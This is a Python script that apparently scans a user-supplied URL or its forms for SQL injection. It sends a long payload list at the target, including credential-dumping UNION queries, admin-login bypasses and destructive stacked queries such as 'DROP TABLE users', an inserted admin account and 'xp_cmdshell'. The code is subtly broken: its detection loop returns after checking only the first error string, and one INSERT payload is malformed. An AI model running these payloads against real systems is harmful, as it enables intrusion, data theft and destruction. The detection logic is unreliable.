import requests
from bs4 import BeautifulSoup

SQL_PAYLOADS = [
    # Authentication Bypass
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1'#",
    "' OR 1=1 --",
    "' OR 1=1#",
    "' OR '1'='1' LIMIT 1 --",
    "' OR '1'='1' UNION SELECT NULL, NULL --",
    
    # Union-Based Injection
    "' UNION SELECT NULL, NULL --",
    "' UNION SELECT 1, @@version --",
    "' UNION SELECT table_name, column_name FROM information_schema.columns --",
    "' UNION SELECT username, password FROM users --",
    "' UNION SELECT NULL, @@user --",
    "' UNION SELECT version(), NULL --",
    "' UNION SELECT NULL, table_name FROM information_schema.tables --",

    # Error-Based Injection
    "' AND 1=CAST((SELECT @@version) AS INT) --",
    "' AND 1=(SELECT COUNT(*) FROM users) --",
    "' AND 1=(SELECT SLEEP(5)) --",
    "' AND 1=1 --",
    "' AND 1=2 --",

    # Time-Based Blind SQL Injection
    "' OR SLEEP(5) --",
    "' AND IF(1=1, SLEEP(5), 0) --",
    "' AND pg_sleep(5) --",
    "' AND (SELECT IF(1=1, SLEEP(5), 0)) --",
    "' OR BENCHMARK(1000000,MD5(1)) --",

    # Boolean-Based Blind SQL Injection
    "' AND 'a'='a' --",
    "' AND 'a'='b' --",
    "' AND 1=1 --",
    "' AND 1=2 --",
    "\" OR 'a'='a' --",
    "\" OR 'a'='b' --",
    
    # Numeric Field Injection
    "1 OR 1=1",
    "1 UNION SELECT NULL, NULL --",
    "1 AND 1=2 --",
    "1 AND SLEEP(5) --",
    "1 UNION SELECT username, password FROM users --",
    
    # Stacked Queries
    "'; DROP TABLE users; --",
    "'; INSERT INTO users ('admin', 'password') VALUES ('admin', '1234'); --",
    "'; UPDATE users SET role='admin' WHERE username='guest'; --",
    "'; EXEC xp_cmdshell('whoami'); --",

    # XML/JSON-Based Injection
    "' OR '1'='1' --",
    "\" OR '1'='1' --",
    "admin' --",
    "admin' /*",
    "admin') OR ('1'='1 --",
    "admin') OR ('1'='1' --",

    # Information Schema Queries
    "' UNION SELECT table_name, column_name FROM information_schema.columns --",
    "' UNION SELECT table_name, column_name FROM information_schema.tables --",
    "' AND 1=1 UNION SELECT table_name FROM information_schema.tables --",
    "' AND 1=1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --",
    "' UNION SELECT username, password FROM users --",
    
    # Evading Filters
    "'%2bOR%2b'1'='1 --",
    "'%20OR%201=1 --",
    "' OR '1'='1'#",
    "' OR 1=1; --",
    "'admin' OR '1'='1'",
    
    # Advanced
    "' UNION SELECT NULL, @@version --",
    "' UNION SELECT NULL, user() --",
    "' UNION SELECT version(), NULL --",
    "' UNION SELECT NULL, current_user --",
    "' UNION SELECT table_name, NULL FROM information_schema.tables --",
    "' UNION SELECT username, password FROM users --"
]


def is_vulnerable(response):
    """Check if the response indicates a SQL injection vulnerability."""
    error_messages = [
        "SQL syntax",
        "mysql_fetch",
        "SQLSTATE",
        "You have an error in your SQL syntax",
        "Warning: mysql_",
        "Unclosed quotation mark after the character string",
        "OperationalError",
        "syntax error",
        "ORA-00933: SQL command not properly ended",
        "PostgreSQL error",
        "Unknown column",
        "Query failed",
        "unterminated quoted string",
        "near \"SELECT\"",
        "Invalid query"
    ]
    for error in error_messages:
        if error in response.text:
            return True
        else:
             return False

def scan_url(url):
    """Scan a URL for SQL injection vulnerabilities."""
    print(f"\n[+] Scanning URL: {url}")

    for payload in SQL_PAYLOADS:
        vulnerable_url = f"{url}{payload}"
        print(f"  Testing payload: {payload}")
        try:
            response = requests.get(vulnerable_url, timeout=5)
            if is_vulnerable(response):
                print(f"  [!] Vulnerable to SQL injection: {vulnerable_url}")
                return
        except requests.exceptions.RequestException as e:
            print(f"  [-] Request failed: {e}")

    print("  [-] No vulnerabilities found.")

def scan_forms(url):
    """Scan forms on a webpage for SQL injection vulnerabilities."""
    print(f"\n[+] Scanning forms on: {url}")

    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        if not forms:
            print("  [-] No forms found on the page.")
            return

        for form in forms:
            action = form.get('action') or ""
            method = form.get('method', 'get').lower()
            inputs = form.find_all('input')

            form_url = url + action if "http" not in action else action
            print(f"  [+] Found form with action: {form_url}")

            
            for payload in SQL_PAYLOADS:
                data = {}
                for input_tag in inputs:
                    name = input_tag.get('name')
                    if name:
                        data[name] = payload

                print(f"    Testing payload: {payload}")
                try:
                    if method == 'post':
                        response = requests.post(form_url, data=data, timeout=5)
                    else:
                        response = requests.get(form_url, params=data, timeout=5)

                    if is_vulnerable(response):
                        print(f"    [!] Form is vulnerable to SQL injection: {form_url}")
                        return
                except requests.exceptions.RequestException as e:
                    print(f"    [-] Request failed: {e}")

    except requests.exceptions.RequestException as e:
        print(f"  [-] Failed to access the page: {e}")

def main():
    """Main function to initiate the scanner."""
    target_url = input("Enter the target URL (e.g., http://example.com/page?param=): ")
    choice = input("Scan for (1) URL Parameters or (2) Forms? [1/2]: ")

    if choice == '1':
        scan_url(target_url)
    elif choice == '2':
        scan_forms(target_url)
    else:
        print("Invalid choice. Please enter 1 or 2.")

if __name__ == "__main__":
    main()
